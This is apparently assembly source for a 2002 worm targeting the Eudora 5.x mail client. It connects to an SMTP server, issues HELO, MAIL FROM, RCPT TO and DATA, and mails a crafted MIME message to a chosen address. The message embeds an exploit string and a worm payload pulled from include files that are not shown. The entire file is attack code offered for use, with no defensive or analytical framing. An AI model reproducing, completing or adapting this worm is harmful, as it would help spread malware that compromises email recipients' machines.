
.586p
.model flat
locals

.xlist
include header.inc
include socket.inc
include consts.inc
.list

STACK_BUFFER EQU 2000h


.data

include worm.inc
        db 0


helo   db "HELO localhost",13,10,0
from   db "MAIL FROM: labs@lexotan32.org",13,10,0
mailto db "RCPT TO: %s",13,10,0

email_body db "From: labs@lexotan32.org",13,10
           db "To: %s",13,10
           db "Subject: Flying V (1st gen)",13,10

           db 'MIME-Version: 1.0',13,10
           db 'Content-Type: multipart/mixed; boundary="%s"',13,10,0

dotdot     db 13,10,'.',13,10,0

usage      db "EUDORA 5.x WORM (c) 2002",13,10
           db "USAGE: <smtp> <email@address>",13,10,0


.data?
argc   dd ?
argv0  db MAX_PATH dup (?)
argv1  db MAX_PATH dup (?)
argv2  db MAX_PATH dup (?)
argv3  db MAX_PATH dup (?)
smtp   dd ?

.code

include console.inc
include cmdline.inc

send_email:
       pushad

       push IPPROTO_TCP
       push SOCK_STREAM
       push PF_INET
       callW socket
       mov ebx,eax
       inc eax
       jz @@error

       push 0
       push 0
       push dwo [smtp]
       push 019000002h
       mov eax, esp

       push 16
       push eax
       push ebx
       callW connect
       add esp, 4*4
       test eax, eax
       jnz @@close_socket

       sub esp,128
       mov edi,esp

       sub esp,STACK_BUFFER
       mov ecx,esp

       push ofs xploit
       push ofs argv2
       push ofs email_body
       push ecx
       callW _wsprintfA

       push ofs argv2
       push ofs mailto
       push edi
       call _wsprintfA

       add esp,7*4
       mov edx,esp

       sub esp,128
       mov ecx,esp

       push 0a0dh
       push "ATAD"
       mov eax, esp

       push 0a0dh
       push "TIUQ"

       mov ebp,esp

       ;ecx=temp buffer (128)
       ;edx=email body (STACK_BUFFER)
       ;edi=mailto (128)

       ;eax=DATA (8)
       ;esp=QUIT (8)
       ;ebp=start of parameters

       push esp
       push ofs dotdot
       push ofs worm+80000000h
       or edx,80000000h
       push edx                 ;email_body
       push eax
       push edi                 ;to
       push ofs from
       push ofs helo

       xchg ecx,esi
  @@loopsend:
       push 0
       push 128
       push esi
       push ebx
       callW recv
       inc eax
       jz @@mail_error

  @@norecv:
       cmp esp, ebp
       je @@mail_error                  ;done...

       pop edi

       mov eax,edi
       btr eax,31

       push eax
       callW lstrlenA

       mov ecx,edi
       btr ecx,31

       cmp ecx,ofs worm
       jne @@zkipz
       mov eax, worm_size
  @@zkipz:

       push 0
       push eax
       push ecx
       push ebx
       callW send
       inc eax
       jz @@mail_error

       bt edi,31
       jc @@norecv

       jmp @@loopsend

  @@mail_error:
       mov esp,ebp
       add esp,(128*2)+(4*4)+STACK_BUFFER

  @@close_socket:
       push ebx
       callW closesocket

  @@error:
       popad
       ret



start:
       call getcmdline

       cmp dwo [argc],3
       jne @@usage

       sub esp, 200h
       push esp
       push 1
       callW WSAStartup
       sub esp, -200h

       lea esi,argv1

       push esi
       callW inet_addr
       cmp eax,-1
       jnz @@done

       push esi
       callW gethostbyname
       test eax,eax
       jz @@exit
       mov eax,[eax+12]
       mov eax,[eax]
       mov eax,[eax]
  @@done:
       mov dwo [smtp],eax

       mov esi, ofs worm
       mov ecx,worm_size
  @@loop:
       lodsb

;***code to check for invalid chars
comment ;
cmp al," "
je @@crlf
cmp al,10
je @@crlf
cmp al,13
jnz @@loop3
@@crlf:
db 0cch
@@loop3:
;

       test al,al
       jnz @@loop2
       mov by [esi-1]," "
  @@loop2:
       loop @@loop

       call send_email

       callW WSACleanup

  @@exit:
       push 0
       callW ExitProcess

  @@usage:
       mov edx, ofs usage
       call dump_asciiz_edx
       push -1
       callW ExitProcess

end    start
